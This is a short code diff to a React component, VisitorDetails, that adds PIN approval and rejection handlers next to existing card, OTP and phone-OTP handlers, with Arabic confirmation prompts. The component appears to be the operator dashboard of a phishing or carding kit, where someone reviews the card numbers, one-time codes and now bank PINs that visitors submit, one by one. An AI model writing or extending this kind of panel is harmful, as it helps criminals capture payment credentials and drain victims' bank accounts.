@@ -11,6 +11,8 @@ import {
   handleCardRejection,
   handleOtpApproval,
   handleOtpRejection,
+  handlePinApproval,
+  handlePinRejection,
   handlePhoneOtpApproval,
   handlePhoneOtpRejection,
   handlePhoneOtpResend,
@@ -555,6 +557,18 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
               // Reject OTP using proper handler
               await handleOtpRejection(visitor.id, historyId, visitor.history || [])
+            }
+          }
+          break
+
+        case "pin":
+          if (action === "approve") {
+            // Approve PIN using proper handler
+            await handlePinApproval(visitor.id, historyId, visitor.history || [])
+          } else if (action === "reject") {
+            if (confirm("هل أنت متأكد من رفض رمز PIN؟")) {
+              // Reject PIN using proper handler
+              await handlePinRejection(visitor.id, historyId, visitor.history || [])
             }
           }
           break
